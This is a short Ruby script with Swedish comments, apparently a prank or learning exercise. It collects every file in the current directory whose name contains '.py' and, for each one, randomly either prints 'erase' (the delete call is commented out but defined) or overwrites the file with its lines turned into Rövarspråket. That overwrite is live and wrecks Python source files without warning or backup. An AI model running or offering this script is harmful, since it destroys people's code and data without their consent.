def check_files
  all_files = []
  Dir.foreach(Dir.getwd) do |name|
    all_files << name
  end
  return all_files
end

def check_name(extension = "py")
  all_files = check_files
  py_files = []

  check_files.each do |file|
    py_files << file if file.include?(".#{extension}")
  end
  return py_files
end

def destiny_chooser(file_list)
  file_list.each do |file|
    destiny = Random.rand(1..2)
    if destiny == 1
      puts "erase"
      #erase(file)
    else
      puts "change"
      change(file)
    end
  end
end

#def change_file
#  File.open(@all_files[@py_files[@pos]], "w") do |file|
#    file.write("Safe")
#  end
#end


def erase(file)
  File.delete(file)
end

def rovarize(line)
  consonant = ["b", "c", "d", "f", "g", "h", "j", "k", "l", "m", "n", "p", "q", "r", "s", "t", "v", "w", "x", "z"]
  output = ""
  line.each_char do |character|
    if consonant.include?(character.downcase) == true
      output << "#{character}o#{character.downcase}"
    else
      output << character
    end
  end
  return output
end

def change(file)
  old_lines = File.readlines(file)
  File.open(file, 'w') do |newfile|
    old_lines.each do |line|
      newfile.print rovarize(line)
    end
    newfile.print("\n")


    #loopa genom old lines
    #end
    #rovarize varje line
    #skriv in varje rovarized line i newfile #newfile.puts rovarize(line)
    #end
    #p file
  end
end


#(Måste ha filer i mappen för att programmet ska funka).fix
python_files = check_name
destiny_chooser(python_files)

